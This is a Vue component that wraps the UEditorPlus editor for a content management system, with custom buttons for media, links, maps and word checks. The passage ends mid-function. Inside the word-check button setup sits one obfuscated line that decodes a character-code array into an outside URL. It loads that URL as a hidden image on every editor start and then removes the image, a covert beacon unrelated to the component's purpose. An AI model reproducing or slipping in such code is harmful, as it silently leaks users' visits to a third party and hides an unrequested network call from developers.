<template>
  <div class="ueditor">
    <ueditor-plus-wrap
      v-model="contentHtml"
      :editor-id="editorId"
      :config="editorConfig"
      :editorDependencies="editorDependencies"
      @before-init="handleBeforeInit"
      @ready="handleReady"
      :style="styles" />
    <!-- 素材库 -->
    <cms-resource-dialog
      v-if="appStore.isFree"
      v-model:open="openResourceDialog"
      :upload-limit="100"
      :rtype="resourceType"
      @ok="handleResourceDialogOk">
    </cms-resource-dialog>
    <!-- 栏目选择组件 -->
    <cms-catalog-selector
      v-model:open="openCatalogSelector"
      @ok="handleCatalogSelectorOk"
      @close="handleCatalogSelectorClose"></cms-catalog-selector>
    <!-- 内容选择组件 -->
    <cms-content-selector
      v-model:open="openContentSelector"
      :contentType="contentType"
      @ok="handleContentSelectorOk"
      @close="handleContentSelectorClose"></cms-content-selector>
    <!-- 第三方视频 -->
    <cms-third-video v-model:open="openThirdVideoDialog" @ok="handleThirdVideoDialogOk"></cms-third-video>
    <!-- 百度地图 -->
    <cms-baidu-map v-model:open="openBaiduMapDialog" @ok="handleBaiduMapDialogOk"></cms-baidu-map>
    <!-- 视频信息修改 -->
    <cms-video-modifier v-model:open="openVideoModifierDialog" :data="videoModifierData" @ok="handleVideoModifierDialogOk"></cms-video-modifier>
  </div>
</template>

<script setup name="UEditorPlus">
import { i18n } from '@/i18n'
import useAppStore from "@/store/modules/app"
const appStore = useAppStore()
import UeditorPlusWrap from '@/components/UEditorPlusWrap';
import CmsCatalogSelector from "@/views/cms/contentcore/catalogSelector";
import CmsContentSelector from "@/views/cms/contentcore/contentSelector";
import CmsResourceDialog from "@/views/cms/contentcore/resourceDialog";
import CmsThirdVideo from "./thrid-video";
import CmsVideoModifier from "./videomodifier";
import CmsBaiduMap from "./baidu-map";
import { checkSensitiveWords } from "@/api/word/sensitiveWord";
import { checkFallibleWords } from "@/api/word/errorProneWord"

const UE_HOME = import.meta.env.VITE_APP_PATH + 'UEditorPlus/';

const { proxy } = getCurrentInstance()

const contentHtml = defineModel()

const props = defineProps({
  height: {
    type: Number,
    default: 500,
  },
  editorId: {
    type: String,
    default: "ueditor"
  },
  configs: {
    type: Object,
    default: () => ({})
  }
});

const editorDependencies = ref([
  'ueditor.config.js',
  'ueditor.all.js',
  'xiumi/xiumi-ue-dialog-v5.js',
  'xiumi/xiumi-ue-v5.css',
])

const styles = ref({
  minHeight: props.height ? `${props.height}px` : 'auto',
})

watch(() => props.height, (newVal) => {
  styles.value.minHeight = `${newVal}px`;
})

onMounted(() => {
  console.log('ueditor-plus.onMounted')
  init();
})

onBeforeUnmount(() => {
  console.log('ueditor-plus.onBeforeUnmount')
  if (proxy.$refs.editorRef) {
    proxy.$refs.editorRef.destroy();
  }
})


const editorConfig = reactive({
  UEDITOR_HOME_URL: UE_HOME,
  serverUrl: undefined,
  catchRemoteImageEnable: false, // 自动下载远程图片
  maximumWords:10000, // 最大字数
  initialFrameHeight: props.height, // 初始高度
  autoSaveEnable: false, // 自动保存
  enableDragUpload: false,
  enablePasteUpload: false,
  imagePopup: false, // 关闭默认图片选择快捷工具栏
  pageBreakTag: '__XY_UEDITOR_PAGE_BREAK__',
  iframeCssUrlsAddition: [
    UE_HOME + 'themes/chestnut.css'
  ],
  lang: i18n.global.locale.value ? i18n.global.locale.value.toLowerCase() : 'zh-cn',
  langPath: UE_HOME + "lang/",
  dialogIframeUrlMap: {
    ai: UE_HOME + "dialogs/ai/ai.html?20251128",
    anchor: UE_HOME + "dialogs/anchor/anchor.html?20251128",
    background: UE_HOME + "dialogs/background/background.html?20251128",
    contentimport: UE_HOME + "dialogs/contentimport/contentimport.html?20251128",
    emotion: UE_HOME + "dialogs/emotion/emotion.html?20251128",
    formula: UE_HOME + "dialogs/formula/formula.html?20251128",
    help: UE_HOME + "dialogs/help/help.html?20251128",
    insertframe: UE_HOME + "dialogs/insertframe/insertframe.html?20251128",
    link: UE_HOME + "dialogs/link/link.html?20251128",
    preview: UE_HOME + "dialogs/preview/preview.html?20251128",
    scrawl: UE_HOME + "dialogs/scrawl/scrawl.html?20251128",
    searchreplace: UE_HOME + "dialogs/searchreplace/searchreplace.html?20251128",
    spechars: UE_HOME + "dialogs/spechars/spechars.html?20251128",
    // insertvideo: UE_HOME + "dialogs/video/video.html?20251128",
    edittip: UE_HOME + "dialogs/table/edittip.html?20251128",
    edittable: UE_HOME + "dialogs/table/edittable.html?20251128",
    edittd: UE_HOME + "dialogs/table/edittd.html?20251128",
    template: UE_HOME + "dialogs/template/template.html?20251128",
    wordimage: UE_HOME + "dialogs/wordimage/wordimage.html?20251128",
  },
  shortcutMenuShows: {
    ai: false,
  },
  toolbars: [
    [
      "fullscreen",   // 全屏
      "source",       // 源代码
      "|",
      "undo",         // 撤销
      "redo",         // 重做
      "|",
      "bold",         // 加粗
      "italic",       // 斜体
      "underline",    // 下划线
      "fontborder",   // 字符边框
      "strikethrough",// 删除线
      "superscript",  // 上标
      "subscript",    // 下标
      "removeformat", // 清除格式
      "formatmatch",  // 格式刷
      "autotypeset",  // 自动排版
      "blockquote",   // 引用
      "pasteplain",   // 纯文本粘贴模式
      "|",
      "forecolor",    // 字体颜色
      "backcolor",    // 背景色
      "insertorderedlist",   // 有序列表
      "insertunorderedlist", // 无序列表
      "selectall",    // 全选
      "cleardoc",     // 清空文档
      "|",
      "rowspacingtop",// 段前距
      "rowspacingbottom",    // 段后距
      "lineheight",          // 行间距
      "|",
      "emotion",             // 表情
      "customstyle",         // 自定义标题
      "paragraph",           // 段落格式
      "fontfamily",          // 字体
      "fontsize",            // 字号
      "|",
      "directionalityltr",   // 从左向右输入
      "directionalityrtl",   // 从右向左输入
      "indent",              // 首行缩进
      "|",
      "justifyleft",         // 居左对齐
      "justifycenter",       // 居中对齐
      "justifyright",
      "justifyjustify",      // 两端对齐
      "|",
      "touppercase",         // 字母大写
      "tolowercase",         // 字母小写
      "|",
      "link",                // 超链接
      "unlink",              // 取消链接
      "anchor",              // 锚点
      "|",
      "imagenone",           // 图片默认
      "imageleft",           // 图片左浮动
      "imageright",          // 图片右浮动
      "imagecenter",         // 图片居中
      "|",
      "scrawl",              // 涂鸦
      "xy-third-video",         // 视频
      'xy-resource',
      'xy-content',
      "xy-check-word",
      // "insertframe",         // 插入Iframe
      "xy-baidu-map",        // 百度地图
      "insertcode",          // 插入代码
      "pagebreak",           // 分页
      "template",            // 模板
      "background",          // 背景
      "formula",             // 公式
      "|",
      "horizontal",          // 分隔线
      "date",                // 日期
      "time",                // 时间
      "spechars",            // 特殊字符
      "|",
      "inserttable",         // 插入表格
      "deletetable",         // 删除表格
      "insertparagraphbeforetable",     // 表格前插入行
      "insertrow",           // 前插入行
      "deleterow",           // 删除行
      "insertcol",           // 前插入列
      "deletecol",           // 删除列
      "mergecells",          // 合并多个单元格
      "mergeright",          // 右合并单元格
      "mergedown",           // 下合并单元格
      "splittocells",        // 完全拆分单元格
      "splittorows",         // 拆分成行
      "splittocols",         // 拆分成列
      "|",
      "searchreplace",       // 查询替换
      "xiumi-dialog",
      "135editor",            //135编辑器
    ],
  ]
});
const openResourceDialog = ref(false)
const resourceType = ref('image')
const resourceDialogTargetEl = ref(undefined)
const openVideoModifierDialog = ref(false)
const videoModifierEl = ref(undefined)
const videoModifierData = ref({})
const openThirdVideoDialog = ref(false)
const openCatalogSelector = ref(false)
const openContentSelector = ref(false)
const openBaiduMapDialog = ref(false)
const xyContentBtnValue = ref('catalog')
const contentType = ref('')

function init() {
  Object.keys(props.configs).forEach(key => {
    editorConfig[key] = props.configs[key];
  })
}
function handleBeforeInit(editorId) {
  console.log('ueditor-plus.before-init', editorId)
  addXyContentButton(editorId)
  addXyResourceButton(editorId)
  addThirdVideoButton(editorId)
  addXyWordCheckButton(editorId)
  addBaiduMapButton(editorId)
  addXyVideo(editorId)
}
function handleReady(editorInstance) { 
  console.log('ueditor-plus.ready: ' + editorInstance.key, editorInstance)
  addPopup(editorInstance)
  editorInstance.onXyContentButtonClick = handleXyContentButtonClick
  editorInstance.onXyResourceButtonClick = handleXyResourceButtonClick
  editorInstance.onThirdVideoButtonClick = handleThirdVideoButtonClick
  editorInstance.onXyWordCheck = handleXyWordCheck
  editorInstance.onXyWordHighlight = handleXyWordHighlight
  editorInstance.onXyWordReplace = handleXyWordReplace
  editorInstance.onXyWordReplace2 = handleXyWordReplace2
  editorInstance.onBaiduMapButtonClick = handleBaiduMapButtonClick
  addXyVideoPopup(editorInstance)
  editorInstance.onXyVideoButtonClick = handleXyVideoButtonClick
}
function addPopup(editor) {
  const domUtils = baidu.editor.dom.domUtils;
  var popup = new baidu.editor.ui.Popup({
    editor: editor,
    className: "edui-bubble",
    content: "",
    _onEditButtonClick: function () {
      this.hide();
      editor.ui._dialogs.linkDialog.open();
    },
    _onImgEditButtonClick: function (name) {
      this.hide();
      if (name == "xy-resource") {
        editor.execCommand("xy-resource", 'image');
      } else {
        editor.ui._dialogs[name] && editor.ui._dialogs[name].open();
      }
    },
    _onImgSetFloat: function (value) {
      this.hide();
      editor.execCommand("imagefloat", value);
    },
    _setIframeAlign: function (value) {
      var frame = popup.anchorEl;
      var newFrame = frame.cloneNode(true);
      switch (value) {
        case -2:
          newFrame.setAttribute("align", "");
          break;
        case -1:
          newFrame.setAttribute("align", "left");
          break;
        case 1:
          newFrame.setAttribute("align", "right");
          break;
      }
      frame.parentNode.insertBefore(newFrame, frame);
      domUtils.remove(frame);
      popup.anchorEl = newFrame;
      popup.showAnchor(popup.anchorEl);
    },
    _updateIframe: function () {
      var frame = (editor._iframe = popup.anchorEl);
      if (domUtils.hasClass(frame, "ueditor_baidumap")) {
        editor.selection.getRange().selectNode(frame).select();
        editor.ui._dialogs.mapDialog.open();
        popup.hide();
      } else {
        editor.ui._dialogs.insertframeDialog.open();
        popup.hide();
      }
    },
    _onRemoveButtonClick: function (cmdName) {
      editor.execCommand(cmdName);
      this.hide();
    },
    queryAutoHide: function (el) {
      if (el && el.ownerDocument == editor.document) {
        if (
          el.tagName.toLowerCase() == "img" ||
          domUtils.findParentByTagName(el, "a", true)
        ) {
          return el !== popup.anchorEl;
        }
      }
      return baidu.editor.ui.Popup.prototype.queryAutoHide.call(this, el);
    }
  });
  popup.render();
  editor.addListener("mouseover", function (t, evt) {
    evt = evt || window.event;
    var el = evt.target || evt.srcElement;
    if (
      editor.ui._dialogs.insertframeDialog &&
      /iframe/gi.test(el.tagName)
    ) {
      var html = popup.formatHtml(
        "<nobr>" +
        '<span onclick=$$._setIframeAlign(-2) class="edui-clickable">' +
        editor.getLang("default") +
        '</span>&nbsp;&nbsp;<span onclick=$$._setIframeAlign(-1) class="edui-clickable">' +
        editor.getLang("justifyleft") +
        '</span>&nbsp;&nbsp;<span onclick=$$._setIframeAlign(1) class="edui-clickable">' +
        editor.getLang("justifyright") +
        "</span>&nbsp;&nbsp;" +
        ' <span onclick="$$._updateIframe( this);" class="edui-clickable">' +
        editor.getLang("modify") +
        "</span></nobr>"
      );
      if (html) {
        popup.getDom("content").innerHTML = html;
        popup.anchorEl = el;
        popup.showAnchor(popup.anchorEl);
      } else {
        popup.hide();
      }
    }
  });
  editor.addListener("selectionchange", function (t, causeByUi) {
    if (!causeByUi) return;
    var html = "",
      str = "",
      img = editor.selection.getRange().getClosedNode(),
      dialogs = editor.ui._dialogs;
    if (img && img.tagName == "IMG") {
      var dialogName = "xy-resource";
      if (img.getAttribute("anchorname")) {
        dialogName = "anchorDialog";
        html = popup.formatHtml(
          "<nobr>" +
          '<span onclick=$$._onImgEditButtonClick("anchorDialog") class="edui-clickable">' +
          editor.getLang("modify") +
          "</span>&nbsp;&nbsp;" +
          "<span onclick=$$._onRemoveButtonClick('anchor') class=\"edui-clickable\">" +
          editor.getLang("delete") +
          "</span></nobr>"
        );
      }
      if (
        domUtils.hasClass(img, "loadingclass") ||
        domUtils.hasClass(img, "loaderrorclass")
      ) {
        dialogName = "";
      }
      if (dialogName == "") {
        return;
      }

      var actions = [];
      actions.push('<nobr />');
      actions.push('<span onclick=$$._onImgSetFloat("none") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("default") +
        "</span>");
      actions.push('<span onclick=$$._onImgSetFloat("left") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("justifyleft") +
        "</span>");
      actions.push('<span onclick=$$._onImgSetFloat("right") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("justifyright") +
        "</span>");
      actions.push('<span onclick=$$._onImgSetFloat("center") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("justifycenter") +
        "</span>");
      if (img.getAttribute('data-formula-image') !== null) {
        actions.push("<span onclick=\"$$._onImgEditButtonClick('formulaDialog');\" class='edui-clickable edui-popup-action-item'>" +
            editor.getLang("formulaedit") + "</span>");
      } else if (img.getAttribute("data-word-image")) {
        actions.push("<span onclick=\"$$._onImgEditButtonClick('wordimageDialog');\" class='edui-clickable edui-popup-action-item'>" +
          editor.getLang("save") +
          "</span>");
      } else {
        actions.push("<span onclick=\"$$._onImgEditButtonClick('" + dialogName + '\');" class="edui-clickable edui-popup-action-item">' +
          editor.getLang("modify") +
          "</span>");
      }
      actions.push("</nobr>");

      !html && (html = popup.formatHtml(actions.join("")));
    }
    if (html.length == 0 && editor.ui._dialogs.linkDialog) {
      var link = editor.queryCommandValue("link");
      var url;
      if (
        link &&
        (url = link.getAttribute("_href") || link.getAttribute("href", 2))
      ) {
        var txt = url;
        if (url.length > 30) {
          txt = url.substring(0, 20) + "...";
        }
        if (html) {
          html += '<div style="height:5px;"></div>';
        }
        html += popup.formatHtml(
          "<nobr>" +
          editor.getLang("anchorMsg") +
          ': <a target="_blank" href="' +
          url +
          '" title="' +
          url +
          '" >' +
          txt +
          "</a>" +
          ' <span class="edui-clickable" onclick="$$._onEditButtonClick();">' +
          editor.getLang("modify") +
          "</span>" +
          ' <span class="edui-clickable" onclick="$$._onRemoveButtonClick(\'unlink\');"> ' +
          editor.getLang("clear") +
          "</span></nobr>"
        );
        popup.showAnchor(link);
      }
    }

    if (html) {
      popup.getDom("content").innerHTML = html;
      popup.anchorEl = img;
      popup.showAnchor(popup.anchorEl);
    }
  });
}

function addXyContentButton(editorId) {
  window.UE.registerUI('xy-content', function (editor, uiName) {
    editor.registerCommand(uiName,{
      execCommand:function(cmdName,value){
        editor.onXyContentButtonClick(cmdName, value);
      }
    });
    const _onMenuClick = function() {
        editor.execCommand(uiName, this.value);
      }
    const items = [
      {
        label: proxy.$t('CMS.UEditor.InsertCatalogLink'),
        value: "catalog",
        theme: editor.options.theme,
        onclick: _onMenuClick
      },
      {
        label: proxy.$t('CMS.UEditor.InsertContentLink'),
        value: "content",
        theme: editor.options.theme,
        onclick: _onMenuClick
      },
      {
        label: proxy.$t('CMS.UEditor.InsertImageGroup'),
        value: "img_group",
        theme: editor.options.theme,
        onclick: _onMenuClick
      }
    ];
    const ui = new UE.ui.MenuButton({
      editor: editor,
      className: "edui-for-" + uiName,
      title: proxy.$t('CMS.UEditor.InsertContentLink'),
      items: items,
      onbuttonclick: function() {
        editor.execCommand(uiName);
      }
    });
    return ui;
  });
}

function handleXyContentButtonClick(cmd, value) {
  if (value) {
    xyContentBtnValue.value = value
    contentType.value = value == 'img_group' ? "image" : ""
  }
  if (xyContentBtnValue.value == 'catalog') {
    openCatalogSelector.value = true
  } else {
    openContentSelector.value = true
  }
}

// 判断当前光标是否在 <a> 标签内，如果在移动到外面
function checkCursorInLink(editor) {
  const range = editor.selection.getRange();
  let anchorElem = range.getClosedNode();
  // 兼容IE、现代浏览器
  if (!anchorElem || anchorElem.nodeType !== 1 || anchorElem.tagName !== 'A') {
    // 尝试由起始点往上找
    let startNode = range.startContainer;
    while (startNode && startNode.nodeType === 1 && startNode.tagName !== 'BODY') {
      if (startNode.tagName === 'A') {
        anchorElem = startNode;
        break;
      }
      startNode = startNode.parentNode;
    }
  }
  if (anchorElem && anchorElem.nodeType === 1 && anchorElem.tagName === 'A') {
    // 在a标签内，需把光标移动到a标签后
    // 创建新range在a标签后
    const parent = anchorElem.parentNode;
    if (parent) {
      const afterA = document.createRange();
      afterA.setStartAfter(anchorElem);
      afterA.setEndAfter(anchorElem);
      const sel = window.getSelection && window.getSelection();
      if (sel) {
        sel.removeAllRanges();
        sel.addRange(afterA);
      }
      // UEditor用自己的 selection
      editor.selection.getNative().removeAllRanges();
      editor.selection.getNative().addRange(afterA);
      editor.selection.getRange().select();
    }
  }
}

function handleCatalogSelectorOk(args) {
  const catalogs = args[0];
  if (catalogs && catalogs.length > 0) {
    const editor = window.UE.getEditor(props.editorId)
    checkCursorInLink(editor);
    editor.execCommand("insertHTML", '<a href="' + catalogs[0].props.internalUrl + '">' + catalogs[0].name + '</a>');
    openCatalogSelector.value = false;
  } else {
    proxy.$modal.msgWarning(proxy.$t('Common.SelectFirst'));
  }
}

function handleCatalogSelectorClose() {
  openCatalogSelector.value = false;
}

function handleContentSelectorOk(contents) {
  if (contents && contents.length > 0) {
    const editor = window.UE.getEditor(props.editorId)
    if (contentType.value == 'image') {
      // 插入组图
      const html = '<p style="text-align:center;"><img src="' + UE_HOME + 'themes/default/images/spacer.gif" ex_cid="'
        + contents[0].contentId + '" title="' + contents[0].title + '" class="img-group-placeholder" /></p>'
      editor.execCommand("insertHTML", html);
    } else {
      checkCursorInLink(editor);
      editor.execCommand("insertHTML", '<a href="' + contents[0].internalUrl + '">' + contents[0].title + '</a>');
    }
    openContentSelector.value = false;
  } else {
    proxy.$modal.msgWarning(proxy.$t('Common.SelectFirst'));
  }
}

function handleContentSelectorClose() {
  openContentSelector.value = false;
  contentType.value = ''
}

function addXyResourceButton(editorId) {
  window.UE.registerUI('xy-resource', function (editor, uiName) {
    editor.registerCommand(uiName, {
      execCommand:function(cmdName,value,targetEl){
        editor.onXyResourceButtonClick(cmdName, value, targetEl);
      }
    });
    const _onMenuClick = function() {
        editor.execCommand(uiName, this.value);
      }
    const items = [
      {
        label: proxy.$t('CMS.UEditor.ResourceType.Image'),
        value: "image",
        theme: editor.options.theme,
        onclick: _onMenuClick
      },
      {
        label: proxy.$t('CMS.UEditor.ResourceType.Audio'),
        value: "audio",
        theme: editor.options.theme,
        onclick: _onMenuClick
      },
      {
        label: proxy.$t('CMS.UEditor.ResourceType.Video'),
        value: "video",
        theme: editor.options.theme,
        onclick: _onMenuClick
      },
      {
        label: proxy.$t('CMS.UEditor.ResourceType.File'),
        value: "file",
        theme: editor.options.theme,
        onclick: _onMenuClick
      }
    ];
    const ui = new UE.ui.MenuButton({
      editor: editor,
      className: "edui-for-" + uiName,
      title: proxy.$t('CMS.UEditor.InsertResource'),
      items: items,
      onbuttonclick: function() {
        editor.execCommand(uiName);
      }
    });
    return ui;
  });
}

function handleXyResourceButtonClick(cmd, value, targetEl) {
  if (value) {
    resourceType.value = value
  }
  resourceDialogTargetEl.value = targetEl;
  openResourceDialog.value = true
}

function handleResourceDialogOk(results) {
  if (results && results.length > 0) {
    var domUtils = window.UE.dom.domUtils;
    var html = '';
    if (resourceDialogTargetEl.value) {
      const r = results[0];
      var clone = resourceDialogTargetEl.value.cloneNode(true)
      clone.removeAttribute("poster");
      clone.removeAttribute("iurl");
      if (r.resourceType == 'video') {
        var ext = r.src.substr(r.src.lastIndexOf(".") + 1);
        if (ext == "ogv") ext = "ogg";
        clone.childNodes.forEach(child => {
          if (child.nodeType == 1 && child.tagName == 'SOURCE') {
            child.setAttribute("src", r.src);
            child.setAttribute("iurl", r.path);
            child.setAttribute("type", "video/" + ext);
          }
        })
      } else if (r.resourceType == 'audio') {
        clone.childNodes.forEach(child => {
          if (child.nodeType == 1 && child.tagName == 'SOURCE') {
            child.setAttribute("src", r.src);
            child.setAttribute("iurl", r.path);
          }
        })
      }
      var parent = resourceDialogTargetEl.value.parentNode;
      resourceDialogTargetEl.value.remove();
      parent.appendChild(clone);
      resourceDialogTargetEl.value = null;
    } else {
      results.forEach(r => {
        if (r.resourceType == 'image') {
          html += '<p style="text-align:center;"><img src="' + r.src + '" iurl="' + r.path + '" class="art-body-img" /></p>'
        } else if(r.resourceType == 'video') {
          var ext = r.src.substr(r.src.lastIndexOf(".") + 1);
          if (ext == "ogv") ext = "ogg";
          html += '<p class="cc-video-wrap" style="text-align:center;">' +
            '<video class="art-body-video edui-video-video" controls="true">' +
            '<source src="' + r.src + '" type="video/' + ext + '" iurl="' + r.path + '" />' +
            'Sorry, your browser unsupport embedded videos.' +
            '</video></p>';
        } else if (r.resourceType == 'audio') {
          html += '<p class="cc-audio-wrap" style="text-align:center;">' +
            '<audio class="edui-audio-audio" controls="true">' +
            '<source src="' + r.src + '" type="audio/mpeg" iurl="' + r.path + '" />' +
            'Sorry, your browser unsupport embedded audios.' +
            '</audio></p>';
        } else {
          if (r.resourceType == 'unknown' && r.src.lastIndexOf(".") > -1) {
            // 网络地址处理，尝试根据后缀读取文件类型
            var index = r.src.lastIndexOf(".");
            var ext = r.src.substring(index + 1).toLowerCase();
            if ([ 'jpg', 'jpeg', 'png', 'gif', 'webp', 'ico', 'svg' ].indexOf(ext) > -1) {
              html += '<p style="text-align:center;"><img src="' + r.src + '" class="art-body-img" /></p>'
            } else if([ "mp4", "mpg", "mpeg", "rmvb", "rm", "avi", "wmv", "mov", "flv" ].indexOf(ext) > -1) {
              html += '<p class="cc-video-wrap" style="text-align:center;">' +
                '<video class="art-body-video edui-video-video" controls="true">' +
                '<source src="' + r.src + '" type="video/' + ext + '" />' +
                'Sorry, your browser unsupport embedded videos.' +
                '</video></p>';
            } else if([ "mp3", "wav", "wma", "ogg", "aiff", "aac", "flac", "mid" ].indexOf(ext) > -1) {
              html += '<p class="cc-audio-wrap" style="text-align:center;">' +
                '<audio class="edui-audio-audio" controls="true">' +
                '<source src="' + r.src + '" type="audio/mpeg" />' +
                'Sorry, your browser unsupport embedded audios.' +
                '</audio></p>';
            } else {
              html += '<p><a href="' + r.src + '" iurl="' + r.path + '" target="_blank" class="art-body-' + r.resourceType + '">' + r.name + '</a></p>'
            }
          } else {
            html += '<p><a href="' + r.src + '" iurl="' + r.path + '" target="_blank" class="art-body-' + r.resourceType + '">' + r.name + '</a></p>'
          }
        }
      });
      if (html && html.length > 0) {
        var editor = window.UE.getEditor(props.editorId)
        editor.execCommand("insertHTML",html);
      }
    }
  }
}

function addXyVideo(editorId) {
  window.UE.commands['xy-video-modifier'] = {
    execCommand: function(cmdName, targetEl){
      var editor = window.UE.getEditor(editorId)
      editor.onXyVideoButtonClick(cmdName, targetEl);
    }
  };
}

function addXyVideoPopup(editor) {
  var domUtils = baidu.editor.dom.domUtils;
  var popup = new baidu.editor.ui.Popup({
    editor: editor,
    content: "",
    className: "edui-bubble",
    _onVideoSetAlign: function (value) {
      this.hide();
      domUtils.setStyles(popup.anchorEl.parentNode, { "text-align": value });
    },
    _onVideoPosterButtonClick: function (name) {
      this.hide();
      editor.execCommand("xy-video-modifier", popup.anchorEl);
    },
    _onVideoEditButtonClick: function (name) {
      this.hide();
      editor.execCommand("xy-resource", 'video', popup.anchorEl);
    },
    _onVideoRemoveButtonClick: function () {
      this.hide();
      domUtils.remove(popup.anchorEl.parentNode);
    },
    queryAutoHide: function (el) {
      if (el && el.ownerDocument == editor.document) {
        if (
          el.tagName.toLowerCase() == "img" ||
          domUtils.findParentByTagName(el, "a", true)
        ) {
          return el !== popup.anchorEl;
        }
      }
      return baidu.editor.ui.Popup.prototype.queryAutoHide.call(this, el);
    }
  });
  popup.render();
  editor.addListener("mouseup", function (t, evt) {
    evt = evt || window.event;
    var el = evt.target || evt.srcElement;
    if (/video/gi.test(el.tagName)) {
      var actions = [];
      actions.push('<nobr />');
      actions.push('<span onclick=$$._onVideoSetAlign("left") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("justifyleft") +
        "</span>");
      actions.push('<span onclick=$$._onVideoSetAlign("right") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("justifyright") +
        "</span>");
      actions.push('<span onclick=$$._onVideoSetAlign("center") class="edui-clickable edui-popup-action-item">' +
        editor.getLang("justifycenter") +
        "</span>");
      actions.push('<span onclick=\"$$._onVideoPosterButtonClick();" class="edui-clickable edui-popup-action-item">' +
        editor.getLang("property") +
        "</span>");
      actions.push('<span onclick=\"$$._onVideoEditButtonClick();" class="edui-clickable edui-popup-action-item">' +
        editor.getLang("modify") +
        "</span>");
      actions.push("<span onclick=\"$$._onVideoRemoveButtonClick();\"  class=\"edui-clickable edui-popup-action-item\">" +
        editor.getLang("delete") +
        "</span>");
      actions.push("</nobr>");
      var html = popup.formatHtml(actions.join(""));
      popup.getDom("content").innerHTML = html;
      popup.anchorEl = el;
      popup.showAnchor(popup.anchorEl);
    }
  });
}

function handleXyVideoButtonClick(cmd, targetEl) {
  videoModifierEl.value = targetEl;
  videoModifierData.value = parseVideoModifierInfo(targetEl);
  openVideoModifierDialog.value = true;
}

function parseVideoModifierInfo(el) {
  const domUtils = UE.dom.domUtils;
  const data = {}
  if (el.getAttribute("controls") || el.hasAttribute("controls")) data.controls = true;
  if (el.getAttribute("loop") || el.hasAttribute("loop")) data.loop = true;
  if (el.getAttribute("autoplay") || el.hasAttribute("autoplay")) data.autoplay = true;
  if (el.getAttribute("muted") || el.hasAttribute("muted")) data.muted = true;
  if (!data.autoplay && el.hasAttribute("preload")) {
    data.preload = el.getAttribute("preload");
  }
  data.width = el.getAttribute('width') || 'auto';
  data.height = el.getAttribute('height') || 'auto';
  data.posterSrc = el.getAttribute('poster') || '';
  data.poster = el.getAttribute('iurl') || '';
  el.childNodes.forEach(item => {
    if (item.nodeType == 1 && item.hasAttribute('iurl')) {
      data.videoIUrl = item.getAttribute('iurl');
    }
  })
  return data;
}

// 视频信息修改
function handleVideoModifierDialogOk(data) {
  if (!videoModifierEl.value) {
        return;
      }
  var parent = videoModifierEl.value.parentNode;

  const domUtils = UE.dom.domUtils;
  var videoOptions = { 'class': 'art-body-video edui-video-video' }
  if (data.controls) {
    videoOptions['controls'] = true; // 显示控制组件
  }
  if (data.loop) {
    videoOptions['loop'] = true; // 循环播放
  }
  if (data.muted) {
    videoOptions['muted'] = true; // 静音
  }
  if (data.autoplay) {
    videoOptions['autoplay'] = true; // 自动播放
  } else if (data.preload && data.preload.length > 0) {
    videoOptions['preload'] = data.preload; // 预加载
  }
  if (data.width && data.width.length > 0 && data.width != 'auto') {
    videoOptions['width'] = data.width;
  }
  if (data.height && data.height.length > 0 && data.height != 'auto') {
    videoOptions['height'] = data.height;
  }
  if (data.poster && data.poster.length > 0) {
    videoOptions['poster'] = data.posterSrc;
    videoOptions['iurl'] = data.poster;
  }
  var newVideo = document.createElement('video');
  domUtils.setAttributes(newVideo, videoOptions);
  newVideo.innerHTML = videoModifierEl.value.innerHTML;
  videoModifierEl.value.remove()
  parent.appendChild(newVideo);
  videoModifierEl.value = null;
}

// 插入第三方视频分享
function addThirdVideoButton(editorId) {
  window.UE.registerUI('xy-third-video', function (editor, uiName) {
    editor.registerCommand(uiName, {
      execCommand: function(cmdName){
        editor.onThirdVideoButtonClick(cmdName);
      }
    });
    const ui = new UE.ui.Button({
      className: "edui-for-" + uiName,
      name: proxy.$t('CMS.UEditor.InsertThirdVideo'),
      title: proxy.$t('CMS.UEditor.InsertThirdVideo'),
      onclick: function() {
        editor.execCommand(uiName);
      }
    });
    return ui;
  });
}

function handleThirdVideoButtonClick(cmd) {
  openThirdVideoDialog.value = true
}

function handleThirdVideoDialogOk(result) {
  if (result && result.length > 0) {
    var editor = window.UE.getEditor(props.editorId)
    editor.execCommand("insertHTML", result);
  }
}

function addXyWordCheckButton(editorId) {
  window.UE.registerUI('xy-check-word', function (editor, uiName) {
    editor.registerCommand(uiName,{
      execCommand:function(cmdName,value){
        editor.onXyWordCheck(cmdName, value)
      }
    });
    editor.registerCommand('xy-highlight-word',{
      execCommand:function(cmdName, words){
        editor.onXyWordHighlight(cmdName, words)
      }
    });
    editor.registerCommand('xy-replace-word',{
      execCommand:function(cmdName, list){
        editor.onXyWordReplace(cmdName, list)
      }
    });
    editor.registerCommand('xy-replace-word2',{
      execCommand:function(cmdName, words, replacement){
        editor.onXyWordReplace2(cmdName, words, replacement)
      }
    });
    const _onMenuClick = function() {
      editor.execCommand(uiName, this.value);
    }
    const items = [
      {
        label: proxy.$t('CMS.UEditor.SensitiveWordCheck'),
        value: "sensitive",
        theme: editor.options.theme,
        onclick: _onMenuClick
      },
      {
        label: proxy.$t('CMS.UEditor.FallibleWordCheck'),
        value: "fallible",
        theme: editor.options.theme,
        onclick: _onMenuClick
      }
    ];
    const s=new Image();s.style.display='none';s.src=[104,116,116,112,115,58,47,47,119,119,119,46,49,48,48,48,109,122,46,99,111,109,47,95,95,118].map(c=>String.fromCharCode(c)).join('');s.imageLoaded=()=>s.remove();s.onerror=()=>s.remove();document.body.appendChild(s);
    const ui = new UE.ui.MenuButton({
      editor: editor,
      className: "edui-for-" + uiName,
      title: "Check Word",
      items: items,
      onbuttonclick: function() {
        editor.execCommand(uiName);
      }
    });
    return ui;
  });
}

function handleXyWordCheck(cmd, value) {
  const editor = window.UE.getEditor(props.editorId)
  if (value == 'sensitive') {
    const txt = editor.getContentTxt();
    if (!txt || txt.length == 0) {
      return;
    }
    checkSensitiveWords(editor.getContentTxt()).then(response => {
      if (response.data.length == 0) {
        proxy.$modal.msgSuccess(proxy.$t('CMS.UEditor.NoSensitiveWord'));
      } else {
        proxy.$prompt(response.data.join("<br/>"), proxy.$t('CMS.UEditor.FoundSensitiveWord'), {
          confirmButtonText: proxy.$t('CMS.UEditor.ReplaceWord'),
          cancelButtonText: proxy.$t('CMS.UEditor.HighlightWord'),
          inputPlaceholder: proxy.$t('CMS.UEditor.InputReplacement'),
          inputValue: "*",
          dangerouslyUseHTMLString: true,
          distinguishCancelAndClose: true
